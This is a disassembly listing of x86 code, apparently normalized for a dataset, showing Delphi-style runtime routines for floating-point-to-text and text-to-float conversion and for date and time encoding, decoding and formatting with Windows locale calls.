dec edx
je r-xdata
sub_40959e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_4095f2
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409539
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_40966c
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409699
jmp r-xdata
call sub_4097bb
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409699
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402e70
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4097bb
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409898
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40994f
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40995a
neg edx
mov ecx esi
call sub_40995a
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40994f
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409976
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402e70
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40995a
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409976
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4099ac
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409398
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404208
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4099dc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409398
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404208
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409a28
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045d8
mov edx esp
xor ecx ecx
call sub_409898
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409a54
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045d8
mov edx esp
xor ecx ecx
call sub_409898
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409a9c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409ae0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409b50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409ae0
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407fa4
sub_409b90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409a9c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407f88
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407f88
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407f88
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409bec
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409c28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409bec
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409cf0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409c28
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407fa4
sub_409d20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409a9c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407f88
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407f88
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407f88
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409bec
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409e6c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409d20
pop esi
pop ecx
pop ebp
retn 0x8
sub_409e8c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_409d20
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_409b90
pop ebx
pop ebp
retn 0x8
sub_409ecc
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409cf0
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409b50
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409b50
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_409f3c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409a9c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409f64
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409cf0
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_409b50
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409fb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_402ac8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_402a98
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_402a98
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40a008
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebx + 0x4 ]
push [ ebx ]
lea eax [ ebp - 0x8 ]
call sub_409fb4
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40a050
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028e8
sub_40a094
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4043d8
mov edx eax
mov eax ebx
call sub_40a050
pop ecx
pop ebx
pop ebp
retn
sub_40a0b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408e88
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40a050
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a100
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40a12c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409e6c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40a164
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409b90
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40a1a4
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a2f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404118
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a2f9
lea eax [ ebp - 0x118 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404388
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4043d8
mov edx eax
mov eax [ ebx ]
call sub_40c77c
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c8f0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404638
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c88c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404310
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c8f0
mov ecx eax
mov eax ebx
mov edx esi
call sub_404208
sub_40a30c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a3ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404118
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a3f1
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404388
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4043d8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404638
sub_40a414
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ab95
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab9c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40413c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c970
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c950
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_40a050
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c970
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40a050
pop ecx
mov al [ eax + lookup_table_40a4f7 ]
jmp [ eax * 4 + jump_table_40a530 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a12c
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a12c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40a1a4
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40a094
pop ecx
jmp r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a12c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a30c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40a094
pop ecx
jmp r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a12c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a100
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a164
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a164
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a164
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a100
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40a100
pop ecx
push ebp
call sub_40a164
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40a164
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408ce4
test eax eax
jne r-xdata
push ebp
call sub_40a100
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a414
pop ecx
push ebp
call sub_40a164
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40a0b4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40a0b4
